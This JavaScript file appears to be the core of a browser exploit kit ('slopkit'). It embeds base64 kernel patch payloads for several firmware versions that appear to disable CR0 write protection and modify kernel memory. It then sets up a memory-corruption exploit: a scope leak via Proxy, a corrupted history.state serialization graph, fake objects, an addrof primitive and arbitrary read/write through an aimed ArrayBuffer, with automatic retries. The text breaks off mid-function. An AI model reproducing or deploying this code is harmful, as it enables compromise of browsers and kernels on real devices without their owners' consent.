(() => {
const __EMBEDDED_PATCHES__ = {
  "1150.bin": "uYIAAMAPMkjB4iCJwEgJwkiNikD+//8PIMBIJf///v8PIsC46wQAAL7rBAAAv5Dp//9BuOsAAABmiYGjdhsAuOsEAABBuesAAABBuusAAABmiYGsvi8AQbvrAAAAuJDp//9IgcIVAwcAZomxs3YbAGaJudN2GwBmRImBtHhiAMaBzQoAAOvGge3SKwDrxoEx0ysA68aBrdMrAOvGgfHTKwDrxoGd1SsA68aBTdorAOvGgR3bKwDrZkSJiZ+BYgDHgZAEAAAAAAAAxoHCBAAA62ZEiZG5BAAAZkSJmbUEAADGgaYSOQDrZomBZHEbAMeBGHcbAJDpPAHHgSDWOwBIMcDDxoE6ph8AN8aBPaYfADfHgYAtEAECAAAASImRiC0QAceBrC0QAQEAAAAPIMBIDQAAAQAPIsAPIMBIJf///v8PIsC460gAALoEAAAARTHARTHJvgUAAABmiYFRVRIAuOsGAAC/BQAAAGaJgZNVEgBBugEAAABIuEGDv6AEAAAAQbsBAAAASImBm1USALgEAAAAZomBrVUSALhJi///x4GpVRIASYuH0MaBr1USAADHgbZVEgBJi7ewZomRulUSAMaBvFUSAADHgc5VEgBJi4dAZomx0lUSAMaB1FUSAADHgdtVEgBJi7cgZom531USAMaB4VUSAADHgfNVEgBJjb/AZkSJgfdVEgDGgflVEgAAx4H/VRIASY2/4GZEiYkDVhIAxoEFVhIAAMeBElYSAEmNvwBmRImRFlYSAMaBGFYSAADHgR5WEgBJjb8gZkSJmSJWEgDGgSRWEgAAZomBL1YSAMaBMVYSAP8PIMBIDQAAAQAPIsAxwMM=",
  "1200.bin": "uYIAAMAPMkjB4iCJwEgJwkiNikD+//8PIMBIJf///v8PIsC46wQAAL7rBAAAv5Dp//9BuOsAAABmiYGjdhsAuOsEAABBuesAAABBuusAAABmiYHswC8AQbvrAAAAuJDp//9IgcJxeQQAZomxs3YbAGaJudN2GwBmRImB9HpiAMaBzQoAAOvGgc3TKwDrxoER1CsA68aBjdQrAOvGgdHUKwDrxoF91isA68aBLdsrAOvGgf3bKwDrZkSJid+DYgDHgZAEAAAAAAAAxoHCBAAA62ZEiZG5BAAAZkSJmbUEAADGgeYUOQDrZomBZHEbAMeBGHcbAJDpPAHHgWDYOwBIMcDDxoEapx8AN8aBHacfADfHgYAtEAECAAAASImRiC0QAceBrC0QAQEAAAAPIMBIDQAAAQAPIsAPIMBIJf///v8PIsC460gAALoEAAAARTHARTHJvgUAAABmiYFRVRIAuOsGAAC/BQAAAGaJgZNVEgBBugEAAABIuEGDv6AEAAAAQbsBAAAASImBm1USALgEAAAAZomBrVUSALhJi///x4GpVRIASYuH0MaBr1USAADHgbZVEgBJi7ewZomRulUSAMaBvFUSAADHgc5VEgBJi4dAZomx0lUSAMaB1FUSAADHgdtVEgBJi7cgZom531USAMaB4VUSAADHgfNVEgBJjb/AZkSJgfdVEgDGgflVEgAAx4H/VRIASY2/4GZEiYkDVhIAxoEFVhIAAMeBElYSAEmNvwBmRImRFlYSAMaBGFYSAADHgR5WEgBJjb8gZkSJmSJWEgDGgSRWEgAAZomBL1YSAMaBMVYSAP8PIMBIDQAAAQAPIsAxwMM=",
  "1250.bin": "uYIAAMAPMkjB4iCJwEgJwkiNikD+//8PIMBIJf///v8PIsC46wQAAL7rBAAAv5Dp//9BuOsAAABmiYHjdhsAuOsEAABBuesAAABBuusAAABmiYEswS8AQbvrAAAAuJDp//9IgcJxeQQAZomx83YbAGaJuRN3GwBmRImBNHtiAMaBzQoAAOvGgQ3UKwDrxoFR1CsA68aBzdQrAOvGgRHVKwDrxoG91isA68aBbdsrAOvGgT3cKwDrZkSJiR+EYgDHgZAEAAAAAAAAxoHCBAAA62ZEiZG5BAAAZkSJmbUEAADGgSYVOQDrZomBpHEbAMeBWHcbAJDpPAHHgaDYOwBIMcDDxoFapx8AN8aBXacfADfHgYAtEAECAAAASImRiC0QAceBrC0QAQEAAAAPIMBIDQAAAQAPIsAxwMM=",
  "1300.bin": "uYIAAMAPMkjB4iCJwEgJwkiNikD+//8PIMBIJf///v8PIsC46wQAAL7rBAAAv5Dp//9BuOsAAABmiYHjdhsAuOsEAABBuesAAABBuusAAABmiYFMwS8AQbvrAAAAuJDp//9IgcJxeQQAZomx83YbAGaJuRN3GwBmRImBhHtiAMaBzQoAAOvGgS3UKwDrxoFx1CsA68aB7dQrAOvGgTHVKwDrxoHd1isA68aBjdsrAOvGgV3cKwDrZkSJiW+EYgDHgZAEAAAAAAAAxoHCBAAA62ZEiZG5BAAAZkSJmbUEAADGgUYVOQDrZomBpHEbAMeBWHcbAJDpPAHHgcDYOwBIMcDDxoF6px8AN8aBfacfADfHgYAtEAECAAAASImRiC0QAceBrC0QAQEAAAAPIMBIDQAAAQAPIsAxwMM=",
  "1302.bin": "uYIAAMAPMkjB4iCJwEgJwkiNikD+//8PIMBIJf///v8PIsC46wQAAL7rBAAAv5Dp//9BuOsAAABmiYHzdhsAuOsEAABBuesAAABBuusAAABmiYFcwS8AQbvrAAAAuJDp//9IgcJxeQQAZomxA3cbAGaJuSN3GwBmRImBhHtiAMaBzQoAAOvGgT3UKwDrxoGB1CsA68aB/dQrAOvGgUHVKwDrxoHt1isA68aBndsrAOvGgW3cKwDrZkSJiW+EYgDHgZAEAAAAAAAAxoHCBAAA62ZEiZG5BAAAZkSJmbUEAADGgVYVOQDrZomBtHEbAMeBaHcbAJDpPAHHgdDYOwBIMcDDxoGKpx8AN8aBjacfADfHgYAtEAECAAAASImRiC0QAceBrC0QAQEAAAAPIMBIDQAAAQAPIsAPIMBIJf///v8PIsC460gAALoEAAAARTHARTHJvgUAAABmiYGRVRIAuOsGAAC/BQAAAGaJgdNVEgBBugEAAABIuEGDv6AEAAAAQbsBAAAASImB21USALgEAAAAZomB7VUSALhJi///x4HpVRIASYuH0MaB71USAADHgfZVEgBJi7ewZomR+lUSAMaB/FUSAADHgQ5WEgBJi4dAZomxElYSAMaBFFYSAADHgRtWEgBJi7cgZom5H1YSAMaBIVYSAADHgTNWEgBJjb/AZkSJgTdWEgDGgTlWEgAAx4E/VhIASY2/4GZEiYlDVhIAxoFFVhIAAMeBUlYSAEmNvwBmRImRVlYSAMaBWFYSAADHgV5WEgBJjb8gZkSJmWJWEgDGgWRWEgAAZomBb1YSAMaBcVYSAP8PIMBIDQAAAQAPIsAxwMM=",
  "1350.bin": "uYIAAMAPMkjB4iCJwEgJwkiNikD+//8PIMBIJf///v8PIsC46wQAAL7rBAAAv5Dp//9BuOsAAABmiYEDdxsAuOsEAABBuesAAABBuusAAABmiYGsxC8AQbvrAAAAuJDp//9IgcJxeQQAZomxE3cbAGaJuTN3GwBmRImBxH9iAMaBzQoAAOvGgU3UKwDrxoGR1CsA68aBDdUrAOvGgVHVKwDrxoH91isA68aBrdsrAOvGgX3cKwDrZkSJia+IYgDHgZAEAAAAAAAAxoHCBAAA62ZEiZG5BAAAZkSJmbUEAADGgRYZOQDrZomBxHEbAMeBeHcbAJDpPAHHgRDdOwBIMcDDxoGapx8AN8aBnacfADfHgYAtEAECAAAASImRiC0QAceBrC0QAQEAAAAPIMBIDQAAAQAPIsAPIMBIJf///v8PIsC460gAALoEAAAARTHARTHJvgUAAABmiYGRVRIAuOsGAAC/BQAAAGaJgdNVEgBBugEAAABIuEGDv6AEAAAAQbsBAAAASImB21USALgEAAAAZomB7VUSALhJi///x4HpVRIASYuH0MaB71USAADHgfZVEgBJi7ewZomR+lUSAMaB/FUSAADHgQ5WEgBJi4dAZomxElYSAMaBFFYSAADHgRtWEgBJi7cgZom5H1YSAMaBIVYSAADHgTNWEgBJjb/AZkSJgTdWEgDGgTlWEgAAx4E/VhIASY2/4GZEiYlDVhIAxoFFVhIAAMeBUlYSAEmNvwBmRImRVlYSAMaBWFYSAADHgV5WEgBJjb8gZkSJmWJWEgDGgWRWEgAAZomBb1YSAMaBcVYSAP8PIMBIDQAAAQAPIsAxwMM=",
  "1352.bin": "uYIAAMAPMkjB4iCJwEgJwkiNikD+//8PIMBIJf///v8PIsC46wQAAL7rBAAAv5Dp//9BuOsAAABmiYGjdxsAuOsEAABBuesAAABBuusAAABmiYGsyC8AQbvrAAAAuJDp//9IgcIQ1QQAZomxs3cbAGaJudN3GwBmRImBxINiAMaBzQoAAOvGge3UKwDrxoEx1SsA68aBrdUrAOvGgfHVKwDrxoGd1ysA68aBTdwrAOvGgR3dKwDrZkSJia+MYgDHgZAEAAAAAAAAxoHCBAAA62ZEiZG5BAAAZkSJmbUEAADGgRYdOQDrZomBZHIbAMeBGHgbAJDpPAHHgRDhOwBIMcDDxoE6qB8AN8aBPagfADfHgYAtEAECAAAASImRiC0QAceBrC0QAQEAAAAPIMBIDQAAAQAPIsAPIMBIJf///v8PIsC460gAALoEAAAARTHARTHJvgUAAABmiYExVhIAuOsGAAC/BQAAAGaJgXNWEgBBugEAAABIuEGDv6AEAAAAQbsBAAAASImBe1YSALgEAAAAZomBjVYSALhJi///x4GJVhIASYuH0MaBj1YSAADHgZZWEgBJi7ewZomRmlYSAMaBnFYSAADHga5WEgBJi4dAZomxslYSAMaBtFYSAADHgbtWEgBJi7cgZom5v1YSAMaBwVYSAADHgdNWEgBJjb/AZkSJgddWEgDGgdlWEgAAx4HfVhIASY2/4GZEiYnjVhIAxoHlVhIAAMeB8lYSAEmNvwBmRImR9lYSAMaB+FYSAADHgf5WEgBJjb8gZkSJmQJXEgDGgQRXEgAAZomBD1cSAMaBEVcSAP8PIMBIDQAAAQAPIsAxwMM=",
};
function __getPatchU8(name) {
  // accept "1150.bin" or full path ending with it
  var key = name;
  var i = key.lastIndexOf("/");
  if (i >= 0) key = key.slice(i + 1);
  var b64 = __EMBEDDED_PATCHES__[key];
  if (!b64) throw new Error("Missing embedded kpatch: " + name);
  var bin = atob(b64);
  var u8 = new Uint8Array(bin.length);
  for (var j = 0; j < bin.length; j++) u8[j] = bin.charCodeAt(j);
  return u8;
}

  // slopkit/core.js?v=10
  var DRAIN_COUNT = 512;
  var AUTO_RETRY_DELAY_MS = 50;
  var K = 2;
  var DUPLICATE_INDEX = 2;
  var CONTROL_INDEX = 65535;
  var CONTROL_INT = -64e3;
  var FILLER_BIGINTS = K - 1;
  var FILLER_OBJECTS = 65534 - K;
  var EXPECTED_LENGTH = 327681;
  var CELL_BYTES = 48;
  var FUNCTION_BYTES = 32;
  var NATIVE_EXECUTABLE_BYTES = 56;
  var HOLDER_BYTES = 64;
  var CARRIER_SLOTS = function() {
    try {
      const q = new URLSearchParams(location.search).get("slots");
      const n = q ? parseInt(q, 10) : 0;
      if (n >= 1e5 && n <= 4e7) return n;
    } catch (e) {
    }
    return 12e6;
  }();
  var CARRIER_BYTES = CARRIER_SLOTS * 8;
  var CAPTURE_DELAY_MS = 50;
  var COMPOSE_DELAY_MS = 100;
  var symbolToString = Symbol.prototype.toString;
  var _gOverride = function() {
    const out = {};
    try {
      const q = new URLSearchParams(location.search).getAll("g");
      for (const item of q) {
        const [k, v] = item.split(":");
        const n = v && v.startsWith("0x") ? parseInt(v, 16) : parseInt(v, 10);
        if (k && n > 0) out[k] = n;
      }
    } catch (e) {
    }
    return out;
  }();
  var _g = (name, dflt) => typeof _gOverride[name] === "number" ? _gOverride[name] : dflt;
  if (typeof _gOverride.drain === "number") DRAIN_COUNT = _gOverride.drain;
  var DRAIN_SIZE = _g("drainsz", 65536);
  var SLAB_SIZE = _g("slab", 4194304);
  var BUTTERFLY_HOLE_SIZE = _g("bfly", 528384);
  var SEPARATOR_SIZE = _g("sep", 65536);
  var EARLY_HOLE_SIZE = _g("early", 458752);
  var GUARD_SIZE = _g("guard", 589824);
  var PREDECESSOR_SIZE = _g("pred", 524288);
  var FINAL_HOLE_SIZE = _g("final", 524288);
  var RW_BUFFER_SIZE = 256;
  var IDENT_OFFSET = 32;
  var LEAK_SLOT_INDEX = 2;
  var LEAK_SLOT_OFFSET = 16 + 8 * LEAK_SLOT_INDEX;
  var REVISION = "slopkit-core-1";
  var attemptKey = `${REVISION}:attempts`;
  var burstKey = `${REVISION}:burst`;
  var rwHeader = new Uint8Array(CELL_BYTES);
  var targetHeader = new Uint8Array(NATIVE_EXECUTABLE_BYTES);
  var holderHeader = new Uint8Array(HOLDER_BYTES);
  var scratchBits = new ArrayBuffer(8);
  var scratchBytes = new Uint8Array(scratchBits);
  var scratchWords = new Uint32Array(scratchBits);
  var scratchDouble = new Float64Array(scratchBits);
  var identityMagic = new Uint8Array([
    90,
    165,
    195,
    60,
    222,
    173,
    190,
    239
  ]);
  var identityBytes = new Uint8Array(8);
  var attemptNumber = 0;
  var attemptCeiling = 0;
  var keepIndex = 0;
  var stopped = false;
  var keepAlive = null;
  var onEvent = null;
  var criticalBarrier = null;
  var settleResolve = null;
  var settleReject = null;
  var running = false;
  var referenceTarget = null;
  var rwBuffer = null;
  var rwView = null;
  var rwMirror = null;
  var targetBuffer = null;
  var targetView = null;
  var nativeTarget = parseInt;
  var fakeHost = null;
  var lengthWord = null;
  var anchorElement = null;
  var markerObjectA = null;
  var markerObjectB = null;
  var targetHolder = null;
  var holderGuardA = null;
  var holderGuardB = null;
  var fillerGraph = null;
  var outerGraph = null;
  var leakedScope = null;
  var getterCarrier = null;
  var preparedSymbolObject = null;
  var capturedString = null;
  var capturedWords = null;
  var copiedLength = 0;
  var captureState = 0;
  var captureError = null;
  var hostAddress = NaN;
  var fakeAddress = NaN;
  var predecessorWords = null;
  var pointerLow = 0;
  var pointerHigh = 0;
  var targetAddress = NaN;
  var targetAddressLow = 0;
  var targetAddressHigh = 0;
  var nativeTargetAddress = NaN;
  var anchorElementAddress = NaN;
  var markerAAddress = NaN;
  var markerBAddress = NaN;
  var rwOriginalVector = NaN;
  var rwHeaderOK = false;
  var holderHeaderOK = false;
  var functionHeaderOK = false;
  var nativeExecutableHeaderOK = false;
  var functionStructureID = 0;
  var nativeExecutableStructureID = 0;
  var executableAddress = NaN;
  var nativeFunctionAddress = NaN;
  var nativeConstructorAddress = NaN;
  var pointersRepeated = false;
  var restoreObserved = false;
  var retrySafe = false;
  var retryScheduled = false;
  var attemptPersisted = false;
  var candidateEverReturned = false;
  var candidateMutationStarted = false;
  var zeroHeaderMiss = false;
  var identityResult = 0;
  var compositionState = 0;
  var compositionLength = 0;
  var compositionError = null;
  var liveCandidate = null;
  var fakeReleased = false;
  var UNSEEN = -1;
  var profile = {
    carrierSID: UNSEEN,
    carrierType: UNSEEN,
    carrierFlags: UNSEEN,
    carrierMode: UNSEEN,
    carrierByte28: UNSEEN,
    holderSID: UNSEEN,
    holderType: UNSEEN,
    holderFlags: UNSEEN,
    functionSID: UNSEEN,
    functionType: UNSEEN,
    functionFlags: UNSEEN,
    nativeExecSID: UNSEEN,
    nativeExecType: UNSEEN,
    nativeExecFlags: UNSEEN,
    cellSize: UNSEEN,
    vectorOffset: 16,
    inlineSlotOffset: 16,
    butterflyOffset: 8,
    vectorOffsetMeasured: false
  };
  function resetProfile() {
    profile.carrierSID = UNSEEN;
    profile.carrierType = UNSEEN;
    profile.carrierFlags = UNSEEN;
    profile.carrierMode = UNSEEN;
    profile.carrierByte28 = UNSEEN;
    profile.holderSID = UNSEEN;
    profile.holderType = UNSEEN;
    profile.holderFlags = UNSEEN;
    profile.functionSID = UNSEEN;
    profile.functionType = UNSEEN;
    profile.functionFlags = UNSEEN;
    profile.nativeExecSID = UNSEEN;
    profile.nativeExecType = UNSEEN;
    profile.nativeExecFlags = UNSEEN;
  }
  function hex(value) {
    return `0x${value.toString(16)}`;
  }
  function buffer(size) {
    return new ArrayBuffer(size);
  }
  function allZero(bytes, start, end) {
    for (let i = start; i < end; ++i) {
      if (bytes[i] !== 0)
        return false;
    }
    return true;
  }
  function uint32At(bytes, offset) {
    return bytes[offset] + bytes[offset + 1] * 256 + bytes[offset + 2] * 65536 + bytes[offset + 3] * 16777216;
  }
  function low48At(bytes, offset) {
    return bytes[offset] + bytes[offset + 1] * 256 + bytes[offset + 2] * 65536 + bytes[offset + 3] * 16777216 + bytes[offset + 4] * 4294967296 + bytes[offset + 5] * 1099511627776;
  }
  function readBytes(destination, source, count) {
    for (let i = 0; i < count; ++i)
      destination[i] = source[i];
  }
  function sameBytes(left, right, count) {
    for (let i = 0; i < count; ++i) {
      if (left[i] !== right[i])
        return false;
    }
    return true;
  }
  function readTwiceMatches(destination, source, count) {
    readBytes(destination, source, count);
    return sameBytes(destination, source, count);
  }
  function aimCarrier(candidate, address) {
    const high = Math.floor(address / 4294967296);
    scratchWords[0] = address - high * 4294967296;
    scratchWords[1] = high;
    for (let i = 0; i < 8; ++i)
      candidate[16 + i] = scratchBytes[i];
  }
  function restoreCarrier(candidate) {
    for (let i = 0; i < 8; ++i)
      candidate[16 + i] = rwHeader[16 + i];
  }
  function pointerFromWords(words, offset) {
    if (words[offset + 3] !== 0)
      return NaN;
    return words[offset] + words[offset + 1] * 65536 + words[offset + 2] * 4294967296;
  }
  function plausibleCell(value) {
    return value > 4294967296 && value <= 281474976710655 && value <= 9007199254740991 && Math.floor(value) === value && value % 8 === 0;
  }
  function plausibleAddress(value) {
    return value > 4294967296 && value <= 281474976710655 && value <= 9007199254740991 && Math.floor(value) === value;
  }
  function canonicalLow48(bytes, offset) {
    return bytes[offset + 6] === 0 && bytes[offset + 7] === 0;
  }
  function dumpHex(bytes, count) {
    let out = "";
    for (let i = 0; i < count; ++i)
      out += bytes[i].toString(16).padStart(2, "0");
    return out;
  }
  function encodedHeaderNumber() {
    const raw = new ArrayBuffer(8);
    const u32 = new Uint32Array(raw);
    const f64 = new Float64Array(raw);
    u32[0] = 16976;
    u32[1] = 17180672;
    return f64[0];
  }
  function emit(tag, detail) {
    if (onEvent === null)
      return;
    try {
      onEvent(tag, detail === void 0 ? "" : String(detail), attemptNumber);
    } catch {
    }
  }
  function checkCarrierIdentity(candidate) {
    if (!plausibleAddress(rwOriginalVector) || rwOriginalVector % 8 !== 0 || IDENT_OFFSET + 8 > RW_BUFFER_SIZE)
      return 0;
    aimCarrier(candidate, rwOriginalVector + IDENT_OFFSET);
    readBytes(identityBytes, rwView, 8);
    restoreCarrier(candidate);
    return sameBytes(identityBytes, identityMagic, 8) && rwView[0] === 60 ? 1 : -1;
  }
  function runIdentityProof(candidate) {
    candidateMutationStarted = true;
    identityResult = checkCarrierIdentity(candidate);
    return identityResult === 1;
  }
  function ceilingReached() {
    return attemptCeiling > 0 && attemptNumber >= attemptCeiling;
  }
  function giveUp(reason) {
    stopped = true;
    emit("CORE-GIVE-UP", `reason=${reason}-attempts=${attemptNumber}`);
    const reject = settleReject;
    settleResolve = null;
    settleReject = null;
    running = false;
    if (reject !== null)
      reject(new Error(`core: gave up after ${attemptNumber} attempts (${reason})`));
  }
  function failed() {
    if (ceilingReached()) {
      giveUp("attempt-ceiling");
      return;
    }
    emit("AUTO-RETRY-AFTER-FAILURE", `attempt=${attemptNumber}`);
    stopped = false;
    retryScheduled = false;
    setTimeout(() => {
      try {
        history.replaceState(null, "");
      } catch {
      }
      attemptNumber++;
      startAttempt();
    }, AUTO_RETRY_DELAY_MS);
  }
  function releaseAttemptAllocations() {
    referenceTarget = null;
    rwBuffer = null;
    rwView = null;
    rwMirror = null;
    targetBuffer = null;
    targetView = null;
    fakeHost = null;
    lengthWord = null;
    anchorElement = null;
    markerObjectA = null;
    markerObjectB = null;
    targetHolder = null;
    holderGuardA = null;
    holderGuardB = null;
    fillerGraph = null;
    outerGraph = null;
    leakedScope = null;
    getterCarrier = null;
    preparedSymbolObject = null;
    capturedString = null;
    capturedWords = null;
    predecessorWords = null;
    keepAlive = null;
    try {
      history.replaceState(null, "");
    } catch {
    }
    if (typeof globalThis.gc === "function") {
      try {
        globalThis.gc();
      } catch {
      }
    }
  }
  function scheduleSafeRetry(reason) {
    if (retryScheduled || stopped)
      return;
    const candidateStateSafe = !candidateEverReturned || zeroHeaderMiss && !candidateMutationStarted;
    if (!retrySafe || !candidateStateSafe || candidateMutationStarted || !attemptPersisted) {
      emit("AUTO-RETRY-NOT-SCHEDULED", `reason=${reason}-safe=${retrySafe}-candidate-seen=${candidateEverReturned}-candidate-mutated=${candidateMutationStarted}-candidate-state-safe=${candidateStateSafe}-attempt-persisted=${attemptPersisted}`);
      failed();
      return;
    }
    if (ceilingReached()) {
      giveUp("attempt-ceiling");
      return;
    }
    retryScheduled = true;
    const nextAttempt = attemptNumber + 1;
    emit("AUTO-RETRY-SCHEDULED", `reason=${reason}-next-attempt=${nextAttempt}`);
    releaseAttemptAllocations();
    setTimeout(() => {
      const candidateStillSafe = !candidateEverReturned || zeroHeaderMiss && !candidateMutationStarted;
      if (!retrySafe || !candidateStillSafe || candidateMutationStarted || stopped) {
        emit("AUTO-RETRY-CANCELLED", `reason=${reason}-retry-safe=${retrySafe}-candidate-safe=${candidateStillSafe}-candidate-mutated=${candidateMutationStarted}`);
        failed();
        return;
      }
      attemptNumber = nextAttempt;
      startAttempt();
    }, Math.max(AUTO_RETRY_DELAY_MS, 750));
  }
  function finishEarlySafeAttempt(tag, extra, reason) {
    retrySafe = true;
    emit(tag, `${extra}-retry-safe=true-candidate-seen=false-candidate-mutated=false`);
    scheduleSafeRetry(reason);
  }
  function resetAttemptState() {
    referenceTarget = null;
    rwBuffer = null;
    rwView = null;
    rwMirror = null;
    targetBuffer = null;
    targetView = null;
    fakeHost = null;
    lengthWord = null;
    anchorElement = null;
    markerObjectA = null;
    markerObjectB = null;
    targetHolder = null;
    holderGuardA = null;
    holderGuardB = null;
    fillerGraph = null;
    outerGraph = null;
    leakedScope = null;
    getterCarrier = null;
    preparedSymbolObject = null;
    capturedString = null;
    capturedWords = null;
    copiedLength = 0;
    captureState = 0;
    captureError = null;
    hostAddress = NaN;
    fakeAddress = NaN;
    predecessorWords = null;
    keepAlive = new Array(DRAIN_COUNT + 3);
    keepIndex = 0;
    pointerLow = 0;
    pointerHigh = 0;
    targetAddress = NaN;
    targetAddressLow = 0;
    targetAddressHigh = 0;
    nativeTargetAddress = NaN;
    anchorElementAddress = NaN;
    markerAAddress = NaN;
    markerBAddress = NaN;
    rwOriginalVector = NaN;
    rwHeaderOK = false;
    holderHeaderOK = false;
    functionHeaderOK = false;
    nativeExecutableHeaderOK = false;
    functionStructureID = 0;
    nativeExecutableStructureID = 0;
    executableAddress = NaN;
    nativeFunctionAddress = NaN;
    nativeConstructorAddress = NaN;
    pointersRepeated = false;
    restoreObserved = false;
    retrySafe = false;
    retryScheduled = false;
    candidateEverReturned = false;
    candidateMutationStarted = false;
    zeroHeaderMiss = false;
    identityResult = 0;
    identityBytes.fill(0);
    compositionState = 0;
    compositionLength = 0;
    compositionError = null;
    liveCandidate = null;
    resetProfile();
    rwHeader.fill(0);
    targetHeader.fill(0);
    holderHeader.fill(0);
  }
  function startAttempt() {
    if (fakeReleased)
      return;
    if (stopped)
      return;
    resetAttemptState();
    try {
      sessionStorage.setItem(attemptKey, String(attemptNumber));
      attemptPersisted = sessionStorage.getItem(attemptKey) === String(attemptNumber);
    } catch {
    }
    emit("ATTEMPT-START", `attempt-persisted=${attemptPersisted}-capture-ms=${CAPTURE_DELAY_MS}-compose-ms=${COMPOSE_DELAY_MS}`);
    try {
      buildAndStoreGraph();
      for (let i = 0; i < 8; ++i)
        rwView[IDENT_OFFSET + i] = identityMagic[i];
      prepareAddrof();
    } catch (error) {
      finishEarlySafeAttempt(
        "SETUP-THREW",
        `${error?.name}:${String(error?.message).slice(0, 80)}`,
        "setup-threw"
      );
    }
  }
  function leakScopeObject() {
    class Leaker {
      leak() {
        return super.foo;
      }
    }
    Leaker.prototype.__proto__ = new Proxy({}, {
      get: function(target, property, receiver) {
        return receiver;
      }
    });
    const leak = Leaker.prototype.leak;
    return function() {
      return leak();
    }();
  }
  function prepareSymbolWrapper(F) {
    leakedScope = leakScopeObject();
    if (leakedScope === void 0 || leakedScope === null)
      throw new Error("scope-not-leaked");
    for (let i = 0; i < 512; i++)
      leakedScope[`p${i}`] = i;
    for (let j = 0; j < 8; j++)
      leakedScope[j] = 1.1 * j;
    Object.defineProperty(leakedScope, "g", { get: F, configurable: true });
    return Object(leakedScope.g);
  }
  function buildFakeHost() {
    rwBuffer = new ArrayBuffer(RW_BUFFER_SIZE);
    rwView = new Uint8Array(rwBuffer);
    rwMirror = new Uint8Array(rwBuffer);
    rwMirror[0] = 60;
    targetBuffer = new ArrayBuffer(32);
    targetView = new Uint8Array(targetBuffer);
    targetView[0] = 165;
    lengthWord = { keep: 1364283729 };
    fakeHost = {
      q0: encodedHeaderNumber(),
      q1: 1.1,
      q2: rwView,
      q3: lengthWord,
      q4: 2.2,
      q5: 3.3
    };
    delete fakeHost.q1;
    delete fakeHost.q4;
    delete fakeHost.q5;
    if (!Number.isFinite(fakeHost.q0) || fakeHost.q2 !== rwView || fakeHost.q3 !== lengthWord || rwView[0] !== 60 || targetView[0] !== 165 || typeof nativeTarget !== "function")
      throw new Error("fake-host-shape-failed");
    anchorElement = document.createElement("textarea");
    markerObjectA = { marker: 1296126539, kind: "probe-marker-a" };
    markerObjectB = { marker: 1296126540, kind: "probe-marker-b" };
    holderGuardA = { marker: 1213156420 };
    holderGuardB = { marker: 1196769618 };
    targetHolder = {
      q0: nativeTarget,
      q1: anchorElement,
      q2: markerObjectA,
      q3: markerObjectB,
      q4: holderGuardA,
      q5: holderGuardB
    };
    if (targetHolder.q0 !== nativeTarget || targetHolder.q1 !== anchorElement || targetHolder.q2 !== markerObjectA || targetHolder.q3 !== markerObjectB || targetHolder.q4 !== holderGuardA || targetHolder.q5 !== holderGuardB || anchorElement === null || typeof anchorElement !== "object" || markerObjectA.marker !== 1296126539 || markerObjectB.marker !== 1296126540)
      throw new Error("probe-holder-shape-failed");
  }
  function buildAndStoreGraph() {
    referenceTarget = { marker: 1364283729, kind: "serialized-reference" };
    buildFakeHost();
    emit("SSV-BUILD", `k=${K}-n=${DRAIN_COUNT}`);
    fillerGraph = new Array(65533);
    let pos = 0;
    const huge = 1n << 40n;
    for (let b = 0; b < FILLER_BIGINTS; ++b)
      fillerGraph[pos++] = huge + BigInt(b);
    for (let o = 0; o < FILLER_OBJECTS; ++o)
      fillerGraph[pos++] = {};
    outerGraph = new Array(CONTROL_INDEX + 1);
    outerGraph[0] = fillerGraph;
    outerGraph[1] = referenceTarget;
    outerGraph[2] = referenceTarget;
    outerGraph[CONTROL_INDEX] = CONTROL_INT;
    emit("SSV-BUILT", `duplicate-index=${DUPLICATE_INDEX}`);
    emit("SSV-STORE-ENTER", `writer-ref=0x${(65536 - K).toString(16)}`);
    history.replaceState(outerGraph, "");
    emit("SSV-STORED", "fake-host-and-probe-holder-not-serialized");
  }
  function prepareAddrof() {
    capturedWords = new Uint16Array(16);
    getterCarrier = function getterCarrierFunction() {
      return 7;
    };
    emit("ADDROF-PREP-BEGIN", `slots=${CARRIER_SLOTS}-bytes=${CARRIER_BYTES}`);
    getterCarrier[0] = fakeHost;
    for (let i = 1; i < CARRIER_SLOTS; i++)
      getterCarrier[i] = 0;
    getterCarrier[1] = targetHolder;
    getterCarrier[2] = fakeHost;
    getterCarrier[3] = targetHolder;
    emit("ADDROF-CARRIER-DONE", "host-holder-host-holder");
    preparedSymbolObject = prepareSymbolWrapper(getterCarrier);
    emit("ADDROF-WRAPPER-READY", `wait=${CAPTURE_DELAY_MS}ms`);
    setTimeout(runAddrofCapture, CAPTURE_DELAY_MS);
    setTimeout(beginComposition, COMPOSE_DELAY_MS);
  }
  function runAddrofCapture() {
    try {
      capturedString = symbolToString.call(preparedSymbolObject);
      copiedLength = capturedString.length;
      for (let i = 0; i < 16; i++)
        capturedWords[i] = capturedString.charCodeAt(7 + i);
      captureState = 1;
    } catch (error) {
      captureError = error;
      captureState = -1;
    }
  }
  function fillRawCellPointers(backing, pointer) {
    pointerHigh = Math.floor(pointer / 4294967296);
    pointerLow = pointer - pointerHigh * 4294967296;
    if (!plausibleCell(pointer) || pointerHigh < 0 || pointerHigh > 65535 || Math.floor(pointerLow) !== pointerLow || pointerLow < 0 || pointerLow > 4294967295 || pointerLow + pointerHigh * 4294967296 !== pointer)
      throw new Error("invalid-low48-fake-address");
    predecessorWords = new Uint32Array(backing);
    for (let i = 0; i < predecessorWords.length; i += 2) {
      predecessorWords[i] = pointerLow;
      predecessorWords[i + 1] = pointerHigh;
    }
    const last = predecessorWords.length - 2;
    if (predecessorWords[0] !== pointerLow || predecessorWords[1] !== pointerHigh || predecessorWords[last] !== pointerLow || predecessorWords[last + 1] !== pointerHigh)
      throw new Error("pointer-fill-verification-failed");
  }
  function clearPredecessor() {
    if (predecessorWords !== null)
      predecessorWords.fill(0);
  }
  function loadHistoryCritical() {
    let result = null;
    let candidate = null;
    let rwHeaderCaptured = false;
    let rwVectorTouched = false;
    try {
      result = history.state;
      compositionLength = result.length;
      if (compositionLength !== EXPECTED_LENGTH) {
        result[DUPLICATE_INDEX] = void 0;
        result = null;
        clearPredecessor();
        retrySafe = true;
        compositionState = 3;
        return;
      }
      if (result[1] === result[DUPLICATE_INDEX]) {
        result[DUPLICATE_INDEX] = void 0;
        candidate = null;
        result = null;
        clearPredecessor();
        retrySafe = true;
        compositionState = 2;
        return;
      }
      candidate = result[DUPLICATE_INDEX];
      candidateEverReturned = true;
      result[DUPLICATE_INDEX] = void 0;
      result = null;
      readBytes(rwHeader, candidate, CELL_BYTES);
      rwHeaderCaptured = true;
      const rwSID = uint32At(rwHeader, 0);
      const rwButterfly = low48At(rwHeader, 8);
      const rwLength = uint32At(rwHeader, 24);
      rwOriginalVector = low48At(rwHeader, 16);
      const rwTailByte = rwHeader[32];
      const rwOffsetZero = allZero(rwHeader, 33, 40) && (rwTailByte === 0 || rwTailByte === 2);
      profile.carrierSID = rwSID;
